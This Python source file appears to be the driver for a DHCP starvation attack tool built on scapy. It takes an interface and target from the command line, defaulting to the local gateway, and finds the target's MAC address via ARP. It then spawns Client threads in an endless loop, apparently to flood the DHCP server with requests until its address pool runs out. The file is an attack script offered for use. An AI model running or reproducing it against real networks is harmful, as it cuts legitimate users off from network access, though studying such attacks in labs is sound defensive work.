import argparse
import random
import threading

from time import sleep
from scapy.config import conf
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP, ICMP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp1, sr1, sendp, sniff
from scapy.utils import mac2str
from random import randint

from Client import Client

# Create the parser
parser = argparse.ArgumentParser(prog='DHCPStarvationNEW.py', description='DHCP Starvation')

# Add the arguments
parser.add_argument('-p', '--persistent', action='store_true', help='persistent?')
parser.add_argument('-i', '--iface', metavar='IFACE', action='store', type=str, help='Interface you wish to use')
parser.add_argument('-t', '--target', metavar='TARGET', action='store', type=str, help='IP of target server')

args = parser.parse_args()
mac_addr = mac2str(Ether().src)


def main():
    # if no interface is specified, use the default interface
    Client.iface = args.iface if args.iface else conf.iface

    # if no target is specified, use the default gateway
    Client.target = args.target if args.target else conf.route.route("0.0.0.0")[2]

    # get mac address of target
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=Client.target, op=1)
    ans = srp1(packet, iface=Client.iface, verbose=0)
    Client.target_mac = ans[Ether].src

    Client.persist = args.persistent

    Client.lock = threading.Lock()

    while True:
        Client.lock.acquire(blocking=True)
        Client().start()
        Client.lock.release()

        sleep(random.random() * 0.1)



if __name__ == '__main__':
    main()
